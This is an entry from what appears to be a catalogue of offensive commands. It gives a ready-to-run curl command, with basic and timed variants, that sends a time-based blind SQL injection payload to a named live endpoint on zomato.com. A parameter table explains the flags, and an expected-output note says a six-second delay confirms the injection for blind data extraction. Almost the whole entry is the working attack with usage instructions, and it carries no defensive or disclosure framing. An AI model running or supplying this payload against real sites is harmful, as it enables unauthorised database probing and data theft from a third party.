---
data: >-
  curl -X POST https://www.zomato.com/php/geto2banner -H "Host: www.zomato.com"
  -H "Connection: close" -H "Content-Length: 73" -H "User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/80.0.3987.149 Safari/537.36" -H "Content-type:
  application/x-www-form-urlencoded" -H "Accept: */*" -H "Accept-Encoding: gzip,
  deflate" -H "Accept-Language: en" -d
  "res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0"
tags:
  - sqli
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.801Z'
id: 868f8518-de0b-4946-bd09-fdfe8772cb68
verified: false
validated: true
submitted: true
---
# curl-post-sqli-payload

## Command

```bash
curl -X POST https://www.zomato.com/php/geto2banner \
  -H "Host: www.zomato.com" \
  -H "Connection: close" \
  -H "Content-Length: 73" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" \
  -H "Content-type: application/x-www-form-urlencoded" \
  -H "Accept: */*" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en" \
  -d "res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0"
```

## Description

This command sends a crafted POST request to exploit Blind SQL Injection in Zomato's /php/geto2banner endpoint using a conditional SLEEP payload to infer database version length via timing delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H` | Adds HTTP headers (e.g., Host, User-Agent) to mimic a browser request | Yes |
| `-d` | Provides the POST data with the SQL payload in res_id and city_id=0 | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.zomato.com/php/geto2banner -d "res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0"
```

### Advanced Usage

```bash
(time curl -X POST https://www.zomato.com/php/geto2banner -H "User-Agent: Mozilla/5.0" -d "res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0") 2>&1
```

Add timing to measure delays explicitly.

## Expected Output

HTTP/1.1 200 OK response body (likely JSON or empty), but key indicator is a ~6-second delay if the SQL condition is true, confirming injection success for blind data extraction.

## Related

- [[Related Procedure|Exploiting-Blind-SQL-Injection-with-SLEEP-Payload]]
